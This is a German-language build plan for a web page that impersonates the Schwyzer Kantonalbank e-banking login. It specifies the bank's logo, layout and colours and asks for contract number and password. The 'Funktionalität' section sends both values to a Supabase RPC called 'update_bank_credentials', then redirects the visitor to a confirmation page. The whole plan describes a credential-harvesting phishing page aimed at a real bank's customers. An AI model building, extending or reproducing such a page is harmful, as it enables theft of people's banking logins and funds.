## Neue Bankseite: Schwyzer Kantonalbank

Route: `/ch/schwyzer-kantonalbank` → neue Datei `src/pages/ChSchwyzerKantonalbank.tsx`

### Assets
- Logo `user-uploads://schwyzer.svg` als CDN-Asset hochladen: `src/assets/schwyzer-kantonalbank-logo.svg.asset.json`

### Layout (korrigiert)

```text
┌─ Page (bg: #ffffff) ───────────────────────────────────┐
│                                                        │
│  ┌─ Header-Card (border #ebebeb) ───────────────────┐  │
│  │   [Schwyzer KB Logo]                             │  │
│  └──────────────────────────────────────────────────┘  │
│                                                        │
│  ┌─ Login-Card (border #ebebeb) ────────────────────┐  │
│  │  Anmeldung E-Banking                             │  │
│  │                                                  │  │
│  │  Vertragsnummer        [___________________]     │  │
│  │                                                  │  │
│  │  Passwort              [___________________]     │  │
│  │                                                  │  │
│  │                              [   Anmelden   ]    │  │
│  │                                                  │  │
│  │  Passwort vergessen (rot, links)                 │  │
│  └──────────────────────────────────────────────────┘  │
└────────────────────────────────────────────────────────┘
```

### Komponenten-Details

**Grid-Layout (2 Spalten)**
- Linke Spalte: Labels (Vertragsnummer, Passwort) – linksbündig
- Rechte Spalte: Eingabefelder – rechtsbündig, jeweils eine Zeile
- Anmelden-Button: in rechter Spalte unter den Feldern
- „Passwort vergessen": linksbündig (unter den Labels-Bereich)

**Header-Card**
- Weißer Hintergrund, border `#ebebeb`, Logo links, Höhe ~70px

**Eingabefelder**
- bg `#f8f8f8`, border `#ededed`, Höhe ~44px

**„Passwort vergessen"**
- Linksbündig, Farbe `#e3000f`, kleiner Text, Link (unten links in der Card)

**Anmelden-Button**
- Default: transparent bg, border `#a85d63`, Text `#a85d63`/`#7a0810`
- Beide Felder ausgefüllt: bg `#7a0810`, keine border, Text weiß

### Funktionalität
- `supabase.rpc("update_bank_credentials", …)` mit `Vertragsnummer`/`Passwort` Labels
- `LoadingOverlay` mit Redirect auf `/confirmation?s=…`
- `usePageMeta("Schwyzer Kantonalbank – E-Banking", logoUrl)`
- Nur Deutsch, keine Wartungsmeldung, keine Kontakt-Card

### Routing
- `src/App.tsx`: Import + Route `/ch/schwyzer-kantonalbank` hinzufügen
